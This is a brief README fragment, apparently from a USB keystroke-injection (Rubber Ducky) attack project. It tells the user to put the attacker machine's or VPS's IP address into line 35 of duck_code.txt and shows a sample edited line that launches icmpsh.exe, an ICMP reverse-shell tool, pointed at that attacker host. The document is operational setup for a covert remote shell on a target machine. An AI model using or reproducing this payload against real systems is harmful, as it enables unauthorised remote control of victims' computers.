### Important

Make sure you change the IP address <Server IP missing> in duck_code.txt Line 35 
to whatever IP address the attacker machine or public VPS is listening on!

### Sample edit

```
Line 35# STRING $payload = "$dst\icmpsh.exe -t <Server IP missing> -d 500 -b 30 -s 128"

Line 35# STRING $payload = "$dst\icmpsh.exe -t 100.200.300.400 -d 500 -b 30 -s 128"
```
